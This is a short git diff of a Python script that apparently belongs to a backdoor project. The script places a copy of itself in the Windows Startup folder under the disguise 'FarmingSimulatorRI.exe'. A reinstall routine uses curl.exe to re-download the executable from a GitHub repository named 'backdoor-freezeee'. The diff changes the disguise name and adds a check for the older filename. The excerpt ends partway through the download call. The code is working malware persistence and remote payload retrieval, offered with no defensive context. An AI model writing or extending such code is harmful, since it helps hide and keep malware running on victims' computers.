@@ -17,11 +17,12 @@ CLIENT_NAME = getpass.getuser()
 current_exe = sys.executable
 startup_folder = os.path.join("C:\\Users", CLIENT_NAME, "AppData", "Roaming",
                             "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-exe_final_location = os.path.join(startup_folder, "FarmingSimulator.exe")
+exe_final_location = os.path.join(startup_folder, "FarmingSimulatorRI.exe")
+old_final_location = os.path.join(startup_folder, "farmingsimulator.exe")
 url = "https://raw.githubusercontent.com/sincezola/backdoor-freezeee/main/src/bin/FarmingSimulatorRI.exe"
 
 def reinstall_program():
-    if not os.path.isfile(exe_final_location):
+    if not os.path.isfile(exe_final_location) and not os.path.isfile(old_final_location):
         subprocess.run(
             [
                 "curl.exe",
